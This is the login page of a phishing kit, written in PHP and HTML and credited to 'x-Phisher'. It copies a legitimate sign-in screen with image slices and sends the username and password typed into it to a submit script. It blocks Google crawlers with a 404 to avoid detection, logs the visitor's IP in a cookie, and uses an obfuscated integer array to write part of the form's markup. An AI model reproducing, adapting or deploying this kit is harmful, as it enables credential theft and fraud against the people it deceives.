<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.ru ===========================
*/
session_start();
error_reporting(0);
include('BOTS/antibots1.php');
include('BOTS/antibots2.php');
include('BOTS/antibots3.php');
include('BOTS/antibots4.php');
include ('BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE html>
<html>
<head>
	<title>Login</title>
</head>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script>
    <script type="text/javascript">
        var getIPAddress = function() {
            $.getJSON("https://jsonip.com?callback=?", function(data) {
                x = data.ip;
                document.cookie = "ip11=;";
                document.cookie = "ip11=" + x;
            });
        };
        getIPAddress();
    </script>
  <div>
    <div id="header" style="position:absolute;left:0px;top:0px;height:120px;width:100%;background-image: url(./files/login/h.jpg);">
      <img src="./files/login/hl.jpg" style="height:120px;width:595px;">
      <img src="./files/login/hr.jpg" style="height:120px;width:525px;" align="right">
    </div>
    <div id="center" style="position:absolute;left:0px;top:121px;height:978px;width:100%;">
      <div style="height:978px;width:1194px;display:block;margin:0 auto;background-image: url(./files/login/c.jpg);">
        <form method="POST" action="./submit/login.php">
          <input name="u" type="text" required="required" style="width: 328px;height: 25px;margin-top:135px;margin-left: 79px;font-size:110%;font-weight:300;border:0px;padding:10px;"><br>
          <input name="p" type="password" required="required" style="width: 328px;height:25px;margin-top:73px;margin-left:79px;border:0px;font-size:110%;font-weight:300;border:0px;padding:10px;"><br>
          <button type="submit" style="width: 348px;height:47px;margin-top:98px;margin-left:79px;border:0px;background-color: Transparent;">

<script language="Javascript">var erp = new Array;
erp[0] = 1013542512;
erp[1] = 1970544756;
erp[2] = 2037409085;
erp[3] = 577268068;
erp[4] = 1684368930;
erp[5] = 544104813;
erp[6] = 1698505331;
erp[7] = 1702000229;
erp[8] = 1919118437;
erp[9] = 1634607648;
erp[10] = 1986096245;
erp[11] = 1698505317;
erp[12] = 1684628585;
erp[13] = 1835362917;
erp[14] = 926967661;
erp[15] = 1634298926;
erp[16] = 1668246828;
erp[17] = 543583842;
erp[18] = 1668246906;
erp[19] = 1080520033;
erp[20] = 1768697443;
erp[21] = 1869423166;
erp[22] = 0;
var em = '';
for(i=0;i<erp.length;i++){
	tmp = erp[i];
	if(Math.floor((tmp/Math.pow(256,3)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
	if(Math.floor((tmp/Math.pow(256,2)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
	if(Math.floor((tmp/Math.pow(256,1)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
	if(Math.floor((tmp/Math.pow(256,0)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
	};
};
document.write(em);
</script> </form>
      </div>
    </div>
    <div id="footer" style="position:absolute;left:0px;top:1100px;height:102px;width:100%;background-image: url(./files/login/f.jpg);">
      <img src="./files/login/fl.jpg">
      <img src="./files/login/fr.jpg" align="right">
    </div>
  </div>
</body>
</html>